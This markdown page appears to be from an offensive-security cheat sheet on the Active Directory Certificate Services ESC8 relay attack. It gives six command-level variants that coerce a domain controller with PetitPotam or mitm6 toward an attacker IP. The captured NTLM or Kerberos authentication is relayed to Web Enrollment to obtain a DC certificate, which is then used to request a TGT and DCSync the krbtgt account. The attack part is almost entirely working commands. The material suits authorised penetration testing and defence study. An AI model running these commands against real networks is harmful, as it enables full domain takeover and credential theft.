# Active Directory - Certificate ESC8

## Web Enrollment Endpoint

Probe the endpoint by sending a request to:

```text
http://<webserver-ip>/certsrv/certfnsp.aspx
```

A valid enrollment endpoint will respond with NTLM/Negotiate authentication headers (`WWW-Authenticate`).

The Web Enrollment role does **not** need to run on the CA itself; it can be hosted on any IIS server configured for delegation to the target CA.

In high-traffic environments, Web Enrollment is commonly deployed on a **dedicated IIS server** to offload traffic from the CA.

> When CA Web Enrollment is installed on a non-CA server, that server acts as an **enrollment registration authority**. The target CA is selected by CA name or computer name. — [Microsoft Docs](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-authority-web-enrollment#deployment-topology)

### Certipy Blind Spot

Certipy **does not** enumerate Web Enrollment on remote IIS servers. It only inspects the CA host. It also does not verify whether a delegated Web Enrollment server is bound to the CA.

```js
Web Enrollment
    HTTP
        Enabled: False
    HTTPS
        Enabled: False
```

> `False` on both means the CA host is not running Web Enrollment but a separate IIS server may still expose it.

## ESC8 - Web Enrollment Relay

> An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller’s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket.

Require [SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket/pull/1101) PR #1101

* **Version 1**: NTLM Relay + Rubeus + PetitPotam

  ```powershell
  impacket> python3 ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs
  impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template VulnTemplate
  # For a member server or workstation, the template would be "Computer".
  # Other templates: workstation, DomainController, Machine, KerberosAuthentication

  # Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam 
  # You can also use any other way to coerce the authentication like PrintSpooler via MS-RPRN
  git clone https://github.com/topotam/PetitPotam
  python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
  python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
  python3 dementor.py <listener> <target> -u <username> -p <password> -d <domain>
  python3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local

  # Use the certificate with rubeus to request a TGT
  Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt
  Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt

  # Now you can use the TGT to perform a DCSync
  mimikatz> lsadump::dcsync /user:krbtgt
  ```

* **Version 2**: NTLM Relay + Mimikatz + Kekeo

  ```powershell
  impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

  # Mimikatz
  mimikatz> misc::efs /server:dc.lab.local /connect:<IP> /noauth

  # Kekeo
  kekeo> base64 /input:on
  kekeo> tgt::ask /pfx:<BASE64-CERT-FROM-NTLMRELAY> /user:dc$ /domain:lab.local /ptt

  # Mimikatz
  mimikatz> lsadump::dcsync /user:krbtgt
  ```

* **Version 3**: Kerberos Relay

  ```ps1
  # Setup the relay
  sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine

  # Run mitm6
  sudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v
  ```

* **Version 4**: ADCSPwn - Require `WebClient` service running on the domain controller. By default this service is not installed.

  ```powershell
  https://github.com/bats3c/ADCSPwn
  adcspwn.exe --adcs <cs server> --port [local port] --remote [computer]
  adcspwn.exe --adcs cs.pwnlab.local
  adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001
  adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\Temp\cert_b64.txt
  adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\mranderson --password The0nly0ne! --dc dc.pwnlab.local

  # ADCSPwn arguments
  adcs            -       This is the address of the AD CS server which authentication will be relayed to.
  secure          -       Use HTTPS with the certificate service.
  port            -       The port ADCSPwn will listen on.
  remote          -       Remote machine to trigger authentication from.
  username        -       Username for non-domain context.
  password        -       Password for non-domain context.
  dc              -       Domain controller to query for Certificate Templates (LDAP).
  unc             -       Set custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam) .
  output          -       Output path to store base64 generated crt.
  ```

* **Version 5**: Certipy ESC8

  ```ps1
  certipy relay -ca 172.16.19.100
  ```

* **Version 6**: Kerberos Relay (self relay in case of only one DC)

  ```ps1
  # Add dns entry with the james forshaw's trick
  dnstool.py -u "domain.local\user" -p "password" -r "computer1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -d "10.10.10.10" --action add "10.10.10.11" --tcp

  # Coerce kerberos with petit potam on dns entry
  petitpotam.py -u 'user' -p 'password' -d domain.local 'computer1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' computer.domain.local

  # relay kerberos
  python3 krbrelayx.py -t 'http://computer.domain.local/certsrv/certfnsh.asp' --adcs --template DomainController -v 'COMPUTER$' -ip 10.10.10.10
  ```

## References

* [AD CS relay attack - practical guide - @exandroiddev - June 23, 2021](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/)
* [ESC8s and Where to Find Them - Abdul Mhanni - March 27, 2026](https://www.abdulmhsblog.com/posts/esc8andfindingwebenrollmentendpoints/)
* [NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema - July 28, 2021](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
